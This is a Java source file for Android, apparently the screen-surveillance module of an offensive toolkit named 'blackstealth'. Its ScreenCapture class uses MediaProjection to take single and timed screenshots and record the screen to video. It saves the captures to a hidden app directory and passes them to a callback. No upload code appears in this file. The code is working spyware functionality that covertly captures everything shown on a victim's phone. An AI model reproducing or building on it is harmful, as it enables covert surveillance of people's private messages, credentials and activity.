package com.offensive.blackstealth.surveillance;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;
import java.io.*;
import java.nio.ByteBuffer;
import java.util.concurrent.*;

/**
 * Screen Capture Module
 * Screenshots and screen recording via MediaProjection
 */
public class ScreenCapture {
    private static final String TAG = "ScreenCapture";
    
    private Context context;
    private MediaProjectionManager projectionManager;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private MediaRecorder mediaRecorder;
    private int screenWidth;
    private int screenHeight;
    private int screenDensity;
    private Handler handler;
    private HandlerThread handlerThread;
    private ExecutorService executor;
    private ScheduledExecutorService scheduler;
    private boolean isCapturing = false;
    private boolean isRecording = false;
    private File outputDir;
    private ScreenCaptureCallback callback;
    
    public interface ScreenCaptureCallback {
        void onScreenshot(byte[] imageData, long timestamp);
        void onRecordingComplete(File videoFile);
        void onError(String error);
    }
    
    public ScreenCapture(Context context) {
        this.context = context;
        this.projectionManager = (MediaProjectionManager) 
            context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        this.executor = Executors.newFixedThreadPool(2);
        this.scheduler = Executors.newScheduledThreadPool(1);
        
        // Get screen dimensions
        WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        wm.getDefaultDisplay().getRealMetrics(metrics);
        screenWidth = metrics.widthPixels;
        screenHeight = metrics.heightPixels;
        screenDensity = metrics.densityDpi;
        
        // Setup output directory
        outputDir = new File(context.getFilesDir(), "captures");
        outputDir.mkdirs();
        
        // Setup handler thread
        handlerThread = new HandlerThread("ScreenCapture");
        handlerThread.start();
        handler = new Handler(handlerThread.getLooper());
    }
    
    public void setCallback(ScreenCaptureCallback callback) {
        this.callback = callback;
    }
    
    /**
     * Get intent for requesting screen capture permission
     */
    public Intent getPermissionIntent() {
        return projectionManager.createScreenCaptureIntent();
    }
    
    /**
     * Initialize with permission result
     */
    public void initialize(int resultCode, Intent data) {
        mediaProjection = projectionManager.getMediaProjection(resultCode, data);
        if (mediaProjection != null) {
            Log.i(TAG, "MediaProjection initialized");
        }
    }
    
    /**
     * Take a single screenshot
     */
    public void takeScreenshot() {
        if (mediaProjection == null) {
            if (callback != null) callback.onError("MediaProjection not initialized");
            return;
        }
        
        executor.submit(() -> {
            try {
                setupImageReader();
                
                // Wait for image
                Thread.sleep(200);
                
                Image image = imageReader.acquireLatestImage();
                if (image != null) {
                    byte[] data = imageToBytes(image);
                    image.close();
                    
                    // Save locally
                    File file = new File(outputDir, "screen_" + System.currentTimeMillis() + ".jpg");
                    saveToFile(data, file);
                    
                    if (callback != null) {
                        callback.onScreenshot(data, System.currentTimeMillis());
                    }
                    
                    Log.i(TAG, "Screenshot captured: " + data.length + " bytes");
                }
                
                teardownImageReader();
                
            } catch (Exception e) {
                Log.e(TAG, "Screenshot failed: " + e.getMessage());
                if (callback != null) callback.onError(e.getMessage());
            }
        });
    }
    
    /**
     * Start periodic screenshots
     */
    public void startPeriodicCapture(int intervalSeconds) {
        if (isCapturing) return;
        isCapturing = true;
        
        scheduler.scheduleAtFixedRate(() -> {
            if (isCapturing) {
                takeScreenshot();
            }
        }, 0, intervalSeconds, TimeUnit.SECONDS);
        
        Log.i(TAG, "Periodic capture started: " + intervalSeconds + "s interval");
    }
    
    /**
     * Stop periodic screenshots
     */
    public void stopPeriodicCapture() {
        isCapturing = false;
    }
    
    /**
     * Start screen recording
     */
    public void startRecording(int maxDurationSeconds) {
        if (mediaProjection == null || isRecording) {
            if (callback != null) callback.onError("Cannot start recording");
            return;
        }
        
        executor.submit(() -> {
            try {
                File outputFile = new File(outputDir, 
                    "record_" + System.currentTimeMillis() + ".mp4");
                
                setupMediaRecorder(outputFile);
                setupVirtualDisplay();
                
                mediaRecorder.start();
                isRecording = true;
                
                Log.i(TAG, "Recording started");
                
                // Auto-stop after max duration
                scheduler.schedule(() -> {
                    if (isRecording) {
                        stopRecording();
                    }
                }, maxDurationSeconds, TimeUnit.SECONDS);
                
            } catch (Exception e) {
                Log.e(TAG, "Recording failed: " + e.getMessage());
                if (callback != null) callback.onError(e.getMessage());
            }
        });
    }
    
    /**
     * Stop screen recording
     */
    public void stopRecording() {
        if (!isRecording) return;
        
        try {
            isRecording = false;
            mediaRecorder.stop();
            mediaRecorder.reset();
            
            if (virtualDisplay != null) {
                virtualDisplay.release();
                virtualDisplay = null;
            }
            
            // Get the recording file
            File[] files = outputDir.listFiles((dir, name) -> name.startsWith("record_"));
            if (files != null && files.length > 0) {
                File latestFile = files[files.length - 1];
                if (callback != null) {
                    callback.onRecordingComplete(latestFile);
                }
            }
            
            Log.i(TAG, "Recording stopped");
            
        } catch (Exception e) {
            Log.e(TAG, "Stop recording failed: " + e.getMessage());
        }
    }
    
    private void setupImageReader() {
        imageReader = ImageReader.newInstance(
            screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);
        
        virtualDisplay = mediaProjection.createVirtualDisplay(
            "ScreenCapture",
            screenWidth, screenHeight, screenDensity,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader.getSurface(), null, handler);
    }
    
    private void teardownImageReader() {
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
    }
    
    private void setupMediaRecorder(File outputFile) throws Exception {
        mediaRecorder = new MediaRecorder();
        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
        mediaRecorder.setVideoEncodingBitRate(5 * 1024 * 1024); // 5 Mbps
        mediaRecorder.setVideoFrameRate(30);
        mediaRecorder.setVideoSize(screenWidth, screenHeight);
        mediaRecorder.setOutputFile(outputFile.getAbsolutePath());
        mediaRecorder.prepare();
    }
    
    private void setupVirtualDisplay() {
        virtualDisplay = mediaProjection.createVirtualDisplay(
            "ScreenRecord",
            screenWidth, screenHeight, screenDensity,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            mediaRecorder.getSurface(), null, handler);
    }
    
    private byte[] imageToBytes(Image image) {
        Image.Plane[] planes = image.getPlanes();
        ByteBuffer buffer = planes[0].getBuffer();
        int pixelStride = planes[0].getPixelStride();
        int rowStride = planes[0].getRowStride();
        int rowPadding = rowStride - pixelStride * screenWidth;
        
        // Create bitmap
        Bitmap bitmap = Bitmap.createBitmap(
            screenWidth + rowPadding / pixelStride, 
            screenHeight, 
            Bitmap.Config.ARGB_8888);
        bitmap.copyPixelsFromBuffer(buffer);
        
        // Crop to actual screen size
        Bitmap croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight);
        bitmap.recycle();
        
        // Compress to JPEG
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        croppedBitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
        croppedBitmap.recycle();
        
        return baos.toByteArray();
    }
    
    private void saveToFile(byte[] data, File file) {
        try (FileOutputStream fos = new FileOutputStream(file)) {
            fos.write(data);
        } catch (Exception e) {
            Log.e(TAG, "Save failed: " + e.getMessage());
        }
    }
    
    public byte[] getLatestScreenshot() {
        File[] files = outputDir.listFiles((dir, name) -> name.startsWith("screen_"));
        if (files != null && files.length > 0) {
            try {
                return readFile(files[files.length - 1]);
            } catch (Exception e) {}
        }
        return null;
    }
    
    public File getLatestRecording() {
        File[] files = outputDir.listFiles((dir, name) -> name.startsWith("record_"));
        if (files != null && files.length > 0) {
            return files[files.length - 1];
        }
        return null;
    }
    
    private byte[] readFile(File file) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        FileInputStream fis = new FileInputStream(file);
        byte[] buffer = new byte[4096];
        int read;
        while ((read = fis.read(buffer)) != -1) {
            baos.write(buffer, 0, read);
        }
        fis.close();
        return baos.toByteArray();
    }
    
    public void release() {
        stopPeriodicCapture();
        if (isRecording) stopRecording();
        teardownImageReader();
        if (mediaProjection != null) {
            mediaProjection.stop();
        }
        handlerThread.quit();
        executor.shutdown();
        scheduler.shutdown();
    }
}
